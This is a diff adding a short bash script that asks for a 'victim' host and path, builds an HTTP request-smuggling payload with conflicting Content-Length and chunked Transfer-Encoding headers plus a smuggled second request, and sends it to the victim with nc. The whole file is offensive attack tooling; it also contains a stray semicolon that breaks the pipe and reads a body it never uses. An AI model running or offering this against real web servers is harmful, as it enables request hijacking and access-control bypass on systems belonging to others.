@@ -1,0 +1,21 @@
+#!/bin/bash
+echo -ne "[+] Enter Victim: "
+read victim
+
+echo -ne "[+] Enter Path: "
+read pagepath
+
+echo -ne "[+] Enter Body: "
+read body
+
+
+echo "POST / HTTP/1.1
+Host: $victim
+Content-Length: 45
+Transfer-Encoding: chunked
+
+0
+
+POST / HTTP/1.1
+Host: $victim
+X: X GET /$pagepath HTTP/1.1"; | nc $victim 80
